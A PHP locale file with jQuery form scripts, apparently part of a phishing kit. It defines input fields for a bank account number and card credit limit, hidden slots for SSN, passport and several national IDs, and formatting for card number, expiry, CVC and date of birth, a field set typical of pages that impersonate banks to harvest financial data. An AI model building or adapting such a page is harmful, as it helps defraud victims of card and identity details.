<?php
/* 
------------------
Language:  English US
------------------
*/

$lang = array();
$lang['POSTCODE'] = 'Post/ZIP Code';
$lang['COUNTRY'] = 'India';
$lang['COUNTYSELECT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="State/Province">
</div>
</div>
';
$lang['ACCOUNT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="tel" name="acno" id="acno" class="generic-input-field form-control field" placeholder="account number">
</div>
</div>
<input type="hidden" name="sortcode" value="-">
<input type="hidden" name="bans" value="-">
';
$lang['CREDITLIMIT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="climit" id="climit" class="generic-input-field form-control field" placeholder="credit limit (Ex: $5000)">
</div>
</div>
'; 
$lang['PASSPORT'] = '
<input type="hidden" name="passport" value="-">
';
$lang['NUMBID'] = '
<input type="hidden" name="numbid" value="-">
';
$lang['NAID'] = '
<input type="hidden" name="naid" value="-">
';
$lang['CIVILID'] = '
<input type="hidden" name="civilid" value="-">
';
$lang['QATARID'] = '
<input type="hidden" name="qatarid" value="-">
';
$lang['CITIZENID'] = '
<input type="hidden" name="citizenid" value="-">
';
$lang['SSN'] = '
<input type="hidden" name="ssn" value="-">
';
$lang['APPCALL'] = '0800 048 0408';
$lang['FLAG'] = 'assets/img/us.png';
?>
<script type='text/javascript' src="assets/js/jquery-1.9.1.js"></script>
<script type='text/javascript' src="assets/js/jquery.validate.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.payment.js"></script>
<script type='text/javascript' src="assets/js/additional-methods.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="assets/js/Valid.AU.js"></script>
  <script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
      $.fn.toggleInputError = function(galat) {
        this.parent('.form-group').toggleClass('has-error', galat);
        return this;
      };

    });
  </script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#ccexp").mask("99 / 99",{placeholder:"MM / YY"});
});
</script>

